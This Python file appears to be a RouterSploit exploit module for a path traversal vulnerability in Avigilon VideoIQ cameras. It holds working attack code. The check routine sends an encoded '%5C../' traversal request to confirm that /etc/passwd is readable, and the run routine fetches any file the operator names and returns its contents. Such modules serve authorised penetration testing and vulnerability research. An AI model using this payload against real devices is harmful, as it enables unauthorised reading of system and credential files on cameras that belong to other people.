from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from routersploit.extsploit import SearchClient


class Exploit(HTTPClient, SearchClient):
    __info__ = {
        "name": "Avigilon VideoIQ Camera Path Traversal",
        "description": "Module exploits Avigilon VideoIQ Camera Path Traversal vulnerability. If target is vulnerable "
                       "it is possible to read file from file system.",
        "authors": (
            "Yakir Wizman",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40284/",
        ),
        "devices": (
            "VideoIQ Camera",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    filename = OptString("/etc/passwd", "File to read from filesystem")

    def run(self):
        results = {}
        if self.check():
            path = "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C..{}".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path
            )

            if response is None:
                return results

            if any(err in response.text for err in ["Error 404 NOT_FOUND", "Problem accessing", "HTTP ERROR 404"]):
                return results

            if response.text:
                results['ExploitInfo'] = {}
                results['ExploitInfo']['URL'] = '{}:{}'.format(self.target, self.port)
                results['ExploitInfo']['Filepath'] = path
                results['ExploitInfo']['FileContent'] = response.text
        return results

    @mute
    def check(self):
        results = {}
        path = "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"

        response = self.http_request(
            method="GET",
            path=path
        )

        if response and utils.detect_file_content(response.text, "/etc/passwd"):
            results['CheckInfo'] = {}
            results['CheckInfo']['URL'] = "{}:{}".format(self.target, self.port)
        return results
